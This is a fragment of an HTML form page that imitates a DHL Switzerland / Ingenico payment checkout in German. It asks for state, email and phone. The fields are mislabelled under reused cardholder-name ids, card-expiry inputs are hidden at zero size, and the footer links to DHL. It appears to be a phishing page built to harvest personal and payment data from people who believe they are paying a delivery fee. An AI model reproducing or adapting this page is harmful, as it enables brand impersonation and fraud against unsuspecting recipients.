            <input name="state" placeholder="City" id="cardholderName" class="form-control cc-name" data-send="true" autocomplete="cc-name" type="text" required="" data-rule-cardholdername="true" data-rule-length="true" oninvalid="this.setCustomValidity('Bundesland')"
  oninput="this.setCustomValidity('')">
<i class="fas fa-file-invoice"></i>  
            <span class="tooltip-button-container" tabindex="0">
                <button type="button" data-content="&lt;span&gt;Geben Sie den Namen des Karteninhabers, wie auf der Karte geschrieben, in lateinischen Buchstaben ein.&lt;/span&gt;" id="cardholder-name-popover" data-toggle="popover" class="info-popover show-js" title="" data-html="true" data-original-title="">
                    <i class="icon-qmark"></i>
                    <span class="sr-only">
                        Zusätzliche Informationen                    </span>
                </button>
            </span>
                            </div>
    </div>
                     <div class="form-group cardholder-name hasIcon" data-display-order="1142">
        <label id="label-cardholderName" for="cardholderName" class="hidden-xs hidden-sm">E-Mail Adresse</label>
                <div class="hasIcon ltr" dir="ltr">
            <input name="email" placeholder="E-Mail address" id="cardholderName" class="form-control cc-name" data-send="true" autocomplete="cc-name" type="text" required="" data-rule-cardholdername="true" data-rule-length="true" oninvalid="this.setCustomValidity('E-Mail Adresse')"
  oninput="this.setCustomValidity('')">
<i class="fa fa-envelope"></i>            <span class="tooltip-button-container" tabindex="0">
                <button type="button" data-content="&lt;span&gt;Geben Sie den Namen des Karteninhabers, wie auf der Karte geschrieben, in lateinischen Buchstaben ein.&lt;/span&gt;" id="cardholder-name-popover" data-toggle="popover" class="info-popover show-js" title="" data-html="true" data-original-title="">
                    <i class="icon-qmark"></i>
                    <span class="sr-only">
                        Zusätzliche Informationen                    </span>
                </button>
            </span>
                            </div>
    </div>
                     <div class="form-group cardholder-name hasIcon" data-display-order="1142">
        <label id="label-cardholderName" for="cardholderName" class="hidden-xs hidden-sm">Telefon</label>
                <div class="hasIcon ltr" dir="ltr">
            <input name="phone" placeholder="Phone Number" id="cardholderName" class="form-control cc-name"  required="" data-rule-cardholdername="true" data-rule-length="true" oninvalid="this.setCustomValidity('Telefon')"
  oninput="this.setCustomValidity('')">
<i class='fa fa-phone'></i>            <span class="tooltip-button-container" tabindex="0">
                <button type="button" data-content="&lt;span&gt;Geben Sie den Namen des Karteninhabers, wie auf der Karte geschrieben, in lateinischen Buchstaben ein.&lt;/span&gt;" id="cardholder-name-popover" data-toggle="popover" class="info-popover show-js" title="" data-html="true" data-original-title="">
                    <i class="icon-qmark"></i>
                    <span class="sr-only">
                        Zusätzliche Informationen                    </span>
                </button>
            </span>
                            </div>
    </div>
                    
                            
      
        
            
                        <div class="clearfix"></div>

 
<div class="checkbox" id="remembermeBlock">
    <label>
        <input name="remember" type="checkbox" class="sendInput" id="rememberme">
        <span id="remembermeText">
            Meine Angaben für zukünftige Einkäufe speichern        </span>
    </label>
    <span class="tooltip-button-container" tabindex="0">
        <button type="button" data-content="Wenn Sie dieses Feld ankreuzen, werden Ihre Zahlungsinformationen für zukünftige Einkäufe gespeichert." data-toggle="popover" class="info-popover show-js" title="" data-original-title="">
            <i class="icon-qmark"></i>
            <span class="sr-only">
                Zusätzliche Informationen            </span>
        </button>
    </span>
</div>            </div>
        <br><br>

                <div class="paymentbuttons" id="paymentButtons">
                    <button id="primaryButton" class="btn btn-block-rpp btn-primary" type="submit" name="doPayment" value="doPayment">
        <span id="paymentbuttontext">
            Next        </span>
    </button>

                                             
                    </div>
    <input name="expiryDateMonth" id="expiryDateMonth" type="text" autocomplete="cc-exp-month" tabindex="-1" aria-labelledby="label-expiryDate" style="opacity: 0; width: 0px; height: 0px; overflow: hidden; pointer-events: none; margin: 0px; padding: 0px; position: absolute;"><input name="expiryDateYear" id="expiryDateYear" type="text" autocomplete="cc-exp-year" tabindex="-1" aria-labelledby="label-expiryDate" style="opacity: 0; width: 0px; height: 0px; overflow: hidden; pointer-events: none; margin: 0px; padding: 0px; position: absolute;"></form>
                                

                                            </div>

            <div class="extra-content">
                <div id="prefootertext">
                    Hier schreiben...                </div>
            </div>
        </div>     </div>
</main>

  <footer id="footerWrapper">
  <div id="footer">

    <div class="footer-menu">

      <div class="container merchant" id="merchantfooter">
    	  <div class="row">
          <nav class="col-xs-24">
            <ul>
                                                                                <li><a href="http://www.dhl.ch/de.html" target="_blank" data-test-selector="footerLink" rel="noopener">Home page</a></li>
                                                                                                <li><a href="http://www.dhl.ch/de/rechtliche_hinweise.html#t_c" target="_blank" data-test-selector="footerLink" rel="noopener">Terms of Use</a></li>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      </ul>
          </nav>
        </div>
      </div>
    </div>
  </div> <!-- footer -->

  <div class="globalcollect" id="paymentprocessorfooter">
      <div class="container">
        <div class="row">
        
        </div>
        <div class="row">
          <div class="col-xs-24" data-test-selector="privacyPolicyContainer" id="privacyPolicyContainer">
                                                <a href="https://payment.pay2.secured-by-ingenico.com/checkout/6742-3c6ca89d905040d3ae7e1a5d4871fa92:64be154f-0626-4068-993f-cb3ec16ebe73:3063e5608e0e4797938d333e66912794/privacy.html" target="_blank" rel="noopener"><span>Privacy Policy</span></a>
                                          </div>
        </div>
      </div>
    </div>
  </footer>
<div id="loading">
  <div class="loading-inner">
    <i class="icon-spinner-1"></i>
  </div>
  <div class="clearfix"></div>
  <div class="loading-text">Ihre Zahlung wird bearbeitet. Bitte warten Sie. Dieser Vorgang kann einige Sekunden in Anspruch nehmen.</div>
</div>

</div> 	
			

</body><loom-container id="lo-engage-ext-container"><loom-shadow classname="resolved"></loom-shadow></loom-container></html>